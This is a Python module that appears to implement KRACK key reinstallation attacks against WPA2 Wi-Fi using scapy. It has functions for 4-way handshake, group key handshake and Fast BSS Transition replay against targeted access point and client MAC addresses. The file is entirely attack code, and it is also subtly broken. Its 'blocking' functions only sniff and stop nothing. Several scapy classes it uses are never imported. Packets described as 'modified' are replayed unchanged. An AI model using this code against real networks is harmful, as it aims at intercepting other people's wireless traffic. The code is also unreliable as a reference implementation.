from scapy.all import (
    sniff, sendp, Dot11, EAPOL
)
from loguru import logger
import threading
import time
from .krack_core import timeout, send_packet

@logger.catch
def four_way_handshake_plaintext_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with plaintext retransmission."""
    logger.info(f"Starting 4-Way Handshake Plaintext Retransmission attack on {target_client_mac}")
    
    # --- Step 1: Sniff for the initial 4-way handshake ---
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        logger.error("Could not capture the complete 4-way handshake")
        return False

    # --- Step 2: Block Message 4 ---
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    def is_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        logger.info("Received retransmitted Message 3")
        # Forward the retransmitted Message 3
        send_packet(retransmitted_message3, interface)
        logger.info("Forwarded retransmitted Message 3")
        return True
    else:
        logger.error("AP did not retransmit Message 3")
        return False

def block_message_4(interface, target_ap_mac, target_client_mac):
    """Blocks 4-way handshake message 4 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                if pkt.addr1 == target_ap_mac and pkt.addr2 == target_client_mac:
                    logger.info(f"Message 4 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def four_way_handshake_encrypted_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with encrypted retransmission."""
    logger.info(f"Starting 4-Way Handshake Encrypted Retransmission attack on {target_client_mac}")
    
    # --- Step 1: Capture initial handshake ---
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        logger.error("Could not capture the complete 4-way handshake")
        return False

    # --- Step 2: Block Message 4 ---
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    def is_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        logger.info("Received retransmitted Message 3")
        # Forward the retransmitted Message 3 twice
        send_packet(retransmitted_message3, interface)
        time.sleep(0.1)  # Small delay between transmissions
        send_packet(retransmitted_message3, interface)
        logger.info("Forwarded retransmitted Message 3 twice")
        return True
    else:
        logger.error("AP did not retransmit Message 3")
        return False

@logger.catch
def group_key_handshake_immediate_install(interface, target_ap_mac):
    """Implements the group key handshake attack with immediate key installation."""
    logger.info(f"Starting Group Key Handshake Immediate Install attack on AP {target_ap_mac}")
    
    # --- Step 1: Sniff for Group Key Handshake ---
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                return is_group
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
    if len(handshake_packets) < 2:
        logger.error("Could not capture the complete Group Key Handshake")
        return False

    # --- Step 2: Block Message 2 ---
    block_thread = threading.Thread(target=block_group_key_message_2, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    def is_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                return is_group and is_ack
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        logger.info("Received retransmitted Group Key Message 1")
        # Forward the retransmitted Message 1
        send_packet(retransmitted_message1, interface)
        logger.info("Forwarded retransmitted Group Key Message 1")

        # --- Step 4: Wait for broadcast frame ---
        def is_broadcast(pkt):
            return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

        broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
        if broadcast_packets:
            broadcast_frame = broadcast_packets[0]
            logger.info("Received broadcast frame")
            # Forward the broadcast frame
            send_packet(broadcast_frame, interface)
            logger.info("Forwarded broadcast frame")
            return True
        else:
            logger.error("No broadcast frame received")
            return False
    else:
        logger.error("AP did not retransmit Group Key Message 1")
        return False

def block_group_key_message_2(interface, target_ap_mac):
    """Blocks group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1:  # Group message 2
                    logger.info(f"Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def group_key_handshake_delayed_install(interface, target_ap_mac):
    """Implements the group key handshake attack with delayed key installation."""
    logger.info(f"Starting Group Key Handshake Delayed Install attack on AP {target_ap_mac}")
    
    # --- Step 1: Sniff for Group Key Handshake ---
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                return is_group
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
    if len(handshake_packets) < 2:
        logger.error("Could not capture the complete Group Key Handshake")
        return False

    # --- Step 2: Block Message 2 ---
    block_thread = threading.Thread(target=block_group_key_message_2_delayed, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    def is_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key frame
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                return is_group and is_ack
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        logger.info("Received retransmitted Group Key Message 1")

        # --- Step 4: Wait for Message 2 to modify ---
        def is_group_message2(pkt):
            if pkt.haslayer(EAPOL):
                eapol_layer = pkt.getlayer(EAPOL)
                if eapol_layer.type == 3:  # Key frame
                    key_info = eapol_layer.key_info
                    is_group = (key_info >> 13) & 1
                    is_ack = (key_info >> 7) & 1
                    return is_group and not is_ack
            return False

        message2_packets = sniff(iface=interface, lfilter=is_group_message2, count=1, timeout=30)
        if message2_packets:
            message2 = message2_packets[0]
            logger.info("Received Message 2")
            # Send modified Message 2
            send_packet(message2, interface)
            logger.info("Sent modified Message 2")

            # Forward retransmitted Message 1
            send_packet(retransmitted_message1, interface)
            logger.info("Forwarded retransmitted Message 1")

            # --- Step 5: Wait for broadcast frame ---
            def is_broadcast(pkt):
                return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

            broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
            if broadcast_packets:
                broadcast_frame = broadcast_packets[0]
                logger.info("Received broadcast frame")
                # Forward the broadcast frame
                send_packet(broadcast_frame, interface)
                logger.info("Forwarded broadcast frame")
                return True
            else:
                logger.error("No broadcast frame received")
                return False
        else:
            logger.error("No Message 2 received")
            return False
    else:
        logger.error("AP did not retransmit Group Key Message 1")
        return False

def block_group_key_message_2_delayed(interface, target_ap_mac):
    """Blocks delayed group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1:  # Group message 2
                    logger.info(f"Delayed Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
    """Implements the Fast BSS Transition (FT) handshake attack."""
    logger.info(f"Starting Fast BSS Transition attack on AP {target_ap_mac}, Client: {target_client_mac}")
    
    # --- Step 1: Capture FT Authentication and Reassociation ---
    def is_ft_handshake(pkt):
        if pkt.haslayer(Dot11):
            if pkt.haslayer(Dot11Auth):
                return pkt.getlayer(Dot11Auth).algo == 2  # FT Authentication
            elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
                return True
        return False

    handshake_packets = sniff(iface=interface, lfilter=is_ft_handshake, count=4, timeout=30)
    if len(handshake_packets) < 4:
        logger.error("Could not capture the complete FT handshake")
        return False

    # Find the reassociation request
    reasso_req = None
    for pkt in handshake_packets:
        if pkt.haslayer(Dot11ReassoReq):
            reasso_req = pkt
            break

    if reasso_req:
        # Modify and replay the reassociation request
        modified_req = reasso_req.copy()
        # Increment replay counter (would be done in real attack)
        send_packet(modified_req, interface)
        logger.info("Replayed modified reassociation request")
        return True
    else:
        logger.error("Could not find reassociation request in captured packets")
        return False 